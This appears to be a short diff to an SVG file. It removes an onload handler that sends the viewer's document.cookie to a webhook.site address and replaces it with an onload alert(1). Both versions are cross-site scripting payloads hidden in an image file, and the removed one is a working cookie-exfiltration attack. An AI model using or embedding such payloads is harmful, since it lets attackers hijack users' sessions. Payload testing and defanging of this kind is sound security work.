@@ -1,2 +1,1 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://webhook.site/47820896-eba0-440d-a950-ca82484827ee.live?c='+document.cookie)">
-</svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
